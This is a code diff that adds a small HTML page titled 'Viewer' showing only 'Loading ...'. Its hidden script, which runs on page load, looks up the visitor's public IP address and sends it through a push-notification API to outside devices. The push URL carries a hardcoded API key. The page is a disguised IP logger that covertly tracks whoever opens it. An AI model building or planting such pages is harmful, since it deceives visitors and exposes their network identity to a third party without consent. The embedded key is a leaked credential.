@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<head>
+<title>Viewer</title>
+<script>
+	function httpget(url){
+		var xml = new XMLHttpRequest();
+		xml.open("GET",url,false);
+		xml.send(null);
+		return xml.responseText;
+	}
+
+	const ip = httpget("https://canihazip.com/s");
+	const push = "https://joinjoaomgcd.appspot.com/_ah/api/messaging/v1/sendPush?deviceId=group.all&text=KEEZ&title=KEEZ&apikey=452c8ba8b18342bc8129eaf783743caf"
+	const x = push.replace("KEEZ",ip);
+	httpget(x);
+</script>
+</head>
+<body>
+<h1>Loading ...</h1>
+</body>
